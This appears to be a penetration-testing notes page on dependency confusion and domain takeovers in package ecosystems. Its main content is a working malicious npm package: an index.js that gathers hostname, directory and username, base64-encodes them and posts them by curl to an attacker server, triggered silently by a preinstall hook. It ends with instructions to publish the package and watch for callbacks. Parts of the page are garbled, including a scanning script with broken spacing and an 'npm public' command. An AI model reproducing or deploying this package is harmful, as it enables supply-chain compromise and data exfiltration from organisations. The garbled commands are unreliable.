---
layout: blank
pagetitle: Dependency Confusion
---

## Domain Name Takeovers
- If source code refers to or uses domains that are no longer active, we can register them and supply malicious code
- A couple examples:
  - Python: `setup(name='my-internal-lib', url='https://internal.examplecorp.com/my-internal-lib', install_requires=['my-internal-lib'])`
  - Node: `import('https://cdn.customcorp-internal.com/pkg.js');`
  - Go: `import "internal.companytools.com/somepkg"`
  - Docker: `FROM registry.dev.oldstartup.com/baseimage:latest`

## Node.js

**Info**
- In Node, npm packages are stated in the package.json file
- Will look something like this:

```json
"devDependencies" : {
    "my_test_framework": "^3.1.0",
    "another_dev_dependency": "1.0.0 - 1.2.0"
}
```
- The `^` symbol indicates versions equal to or higher than the version listed

**Package Scopes**
- Packages can be unscoped (public packages on npm)
    - Specified by listing the package name alone
- Can also be scoped
    - Belongs to a user/organization
    - Must be preceded by the organizations's name
        - `@org-name/package` or `@username/package`

**Exploitation**
- Find packages that are used without a reserved namespace (unscoped)
  - This could look like `org-name/package` (without the `@`)
- Node will then use the public package over the private one, allowing code execution
- [Synyc](https://github.com/snyk-labs/snync) is a good tool to scan for and recognize these packages:

```sh
# !/bin/bash
# Set the base directory to the current working directory
BASE_DIR =$( pwd )
# Loop through each directory in the base directory
for dir in " $BASE_DIR " /*/; do
    # Check if package . json exists in the directory
    if [ -f "${ dir } package . json " ]; then
        echo " Scanning repository : ${ dir }"
        # Run the npx snyk command in the directory
        npx snync -- directory " $dir "
    else
        echo " No package . json found in : ${ dir }. Skipping ... "
    fi
done
```
- Alternatively, try [https://github.com/visma-prodsec/confused](https://github.com/visma-prodsec/confused)
- Then you just have to host the package yourself

**Creating a Malicious package**
- Create `index.js`:

```js
const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attacker-server} -d $b" , (error, data, getter) => {
    if (error){
        console.log("error", error.message);
        return;
    }
    if (getter){
        console.log(data);
        return;
    }
    console.log(data);
});
```
- Create `package.json`:

```json
{
    "name":"{vulnerable_package_name}",
    "version":"{relevant_version_or_higher_if_^}",
    "description":"",
    "main":"main.js",
    "scripts":{
        "preinstall":"node index.js > /dev/null 2>&1",
        "test":"echo \"Error: no test specified\""
    },
    "author":"asdasfasd.asfasdasfasd",
    "license":"MIT"
}
```

- Then just run `npm public --access=public` and monitor attacker server